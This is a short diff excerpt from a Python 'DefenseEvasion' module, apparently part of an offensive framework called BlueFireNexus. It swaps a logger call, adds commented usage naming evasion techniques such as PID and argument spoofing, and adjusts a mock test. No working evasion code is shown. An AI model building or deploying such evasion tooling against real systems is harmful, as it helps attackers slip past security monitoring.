-        self.logger.error(message, exc_info=exc_info)
+        logger.error(message, exc_info=exc_info)
+
+# Example Usage (within BlueFireNexus execute_operation):
+# defense_evasion_module = DefenseEvasion(execution_module_instance)
+# operation_data = {
+#     "technique": "pid_spoofing", # or "file_evasion", "argument_spoofing"
+#     "details": { ... }
+# }
+# result = defense_evasion_module.run_evasion(operation_data)
 
 # Example Usage (for testing)
 if __name__ == '__main__':
@@ -563,7 +410,7 @@ if __name__ == '__main__':
             return {"results": {"command_execution": {"status": "success", "details": {"return_code": 0, "stdout": "Mock success", "stderr": ""}}}}
 
     mock_exec = MockExecution()
-    evasion_module = DefenseEvasion(nexus_instance=None, execution_module=mock_exec)
+    evasion_module = DefenseEvasion(execution_module=mock_exec)
     # evasion_module.update_config({}) # Load actual config here if needed
 
     # Create dummy files for testing
